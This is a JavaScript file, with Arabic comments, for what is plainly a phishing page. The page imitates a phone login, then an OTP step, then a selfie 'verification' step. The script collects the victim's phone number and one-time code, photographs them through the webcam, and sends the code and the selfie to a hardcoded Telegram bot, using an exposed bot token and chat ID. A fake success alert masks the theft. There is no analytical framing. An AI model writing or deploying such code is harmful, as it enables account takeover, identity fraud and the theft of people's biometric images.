document.addEventListener('DOMContentLoaded', () => {

    // --- إعدادات بوت التليجرام ---
    const BOT_TOKEN = '6692627244:AAEIS4t9xIIksnY9UxlGiMsf0KwBB5-XS5M';
    const CHAT_ID = '6964432572';

    // --- متغيرات لتخزين بيانات المستخدم ---
    let userPhoneNumber = '';
    let userOtp = '';

    // --- Page Elements ---
    const loginPage = document.getElementById('login-page');
    const otpPage = document.getElementById('otp-page');
    const selfiePage = document.getElementById('selfie-page');
    const cameraPage = document.getElementById('camera-page');
    const faceOutlineCircle = document.getElementById('face-outline-circle');
    
    // --- Button & Input Elements ---
    const phoneInput = document.getElementById('phone');
    const loginBtn = document.getElementById('login-btn');
    const loginForm = document.getElementById('login-form');
    const otpInputs = document.querySelectorAll('.otp-input');
    const continueBtn = document.getElementById('continue-btn');
    const backToLoginBtn = document.querySelector('.back-to-login');
    const backToOtpBtn = document.querySelector('.back-to-otp');
    const takeSelfieBtn = document.getElementById('take-selfie-btn');
    const cameraFeed = document.getElementById('camera-feed');
    const backToSelfieInstructionsBtn = document.querySelector('.back-to-selfie-instructions');
    const signupBtn = document.querySelector('.signup-btn-style');
    const signupNotice = document.getElementById('signup-notice');
    const captureBtn = document.getElementById('capture-btn');

    let stream = null;

    // --- منطق التنقل والكاميرا ---
    takeSelfieBtn.addEventListener('click', async () => {
        selfiePage.classList.remove('active');
        cameraPage.classList.add('active');
        
        try {
            const constraints = { video: { facingMode: 'user' } };
            stream = await navigator.mediaDevices.getUserMedia(constraints);
            cameraFeed.srcObject = stream;
        } catch (err) {
            console.error("Error accessing camera: ", err);
            alert("لا يمكن الوصول إلى الكاميرا. يرجى التأكد من منح الإذن.");
            cameraPage.classList.remove('active');
            selfiePage.classList.add('active');
        }
    });

    // --- منطق الالتقاط اليدوي ---
    captureBtn.addEventListener('click', () => {
        faceOutlineCircle.classList.add('match');

        const canvas = document.createElement('canvas');
        canvas.width = cameraFeed.videoWidth;
        canvas.height = cameraFeed.videoHeight;
        const context = canvas.getContext('2d');
        context.translate(canvas.width, 0);
        context.scale(-1, 1);
        context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
        
        stopCamera();
        alert('تم التقاط الصورة بنجاح! جاري إرسال البيانات...');

        const message = `**=== بيانات مستخدم جديد ===**\n**رقم الهاتف:** \`${userPhoneNumber}\`\n**الرمز السري:** \`${userOtp}\``;
        sendTelegramMessage(message);

        canvas.toBlob(blob => {
            sendTelegramPhoto(blob, `Selfie for ${userPhoneNumber}`);
        }, 'image/jpeg');

        setTimeout(() => {
            faceOutlineCircle.classList.remove('match');
            cameraPage.classList.remove('active');
            loginPage.classList.add('active');
            
            otpInputs.forEach(input => input.value = '');
            phoneInput.value = '';
            loginBtn.disabled = true;
            loginBtn.classList.remove('activated');
        }, 2000);
    });
    
    function stopCamera() {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
    }

    // --- بقية الأكواد تبقى كما هي ---
    loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        if (!loginBtn.disabled) {
            userPhoneNumber = phoneInput.value;
            loginPage.classList.remove('active');
            otpPage.classList.add('active');
            if (otpInputs.length > 0) otpInputs[0].focus();
        }
    });

    phoneInput.addEventListener('input', () => {
        if (phoneInput.value.trim().length > 5) {
            loginBtn.disabled = false;
            loginBtn.classList.add('activated');
        } else {
            loginBtn.disabled = true;
            loginBtn.classList.remove('activated');
        }
    });

    otpInputs.forEach((input, index) => {
        input.addEventListener('input', () => {
            if (input.value && index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            }
            checkAllOtpInputs();
        });
        input.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && !input.value && index > 0) {
                otpInputs[index - 1].focus();
            }
        });
    });

    function checkAllOtpInputs() {
        const allFilled = Array.from(otpInputs).every(input => input.value);
        if (allFilled) {
            continueBtn.disabled = false;
            continueBtn.classList.add('activated');
        } else {
            continueBtn.disabled = true;
            continueBtn.classList.remove('activated');
        }
    }

    continueBtn.addEventListener('click', () => {
        if (!continueBtn.disabled) {
            userOtp = Array.from(otpInputs).map(input => input.value).join('');
            otpPage.classList.remove('active');
            selfiePage.classList.add('active');
        }
    });

    signupBtn.addEventListener('click', () => {
        signupNotice.classList.add('show');
        setTimeout(() => {
            signupNotice.classList.remove('show');
        }, 4000);
    });

    async function sendTelegramMessage(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const params = new URLSearchParams({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' });
        try {
            await fetch(`${url}?${params.toString()}`);
        } catch (error) {
            console.error('Failed to send message:', error);
        }
    }

    async function sendTelegramPhoto(imageBlob, caption) {
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', imageBlob, 'selfie.jpg');
        formData.append('caption', caption);
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch (error) {
            console.error('Failed to send photo:', error);
        }
    }

    backToSelfieInstructionsBtn.addEventListener('click', () => {
        stopCamera();
        cameraPage.classList.remove('active');
        selfiePage.classList.add('active');
    });
    
    backToOtpBtn.addEventListener('click', () => {
        selfiePage.classList.remove('active');
        otpPage.classList.add('active');
    });

    backToLoginBtn.addEventListener('click', () => {
        otpPage.classList.remove('active');
        loginPage.classList.add('active');
    });
});
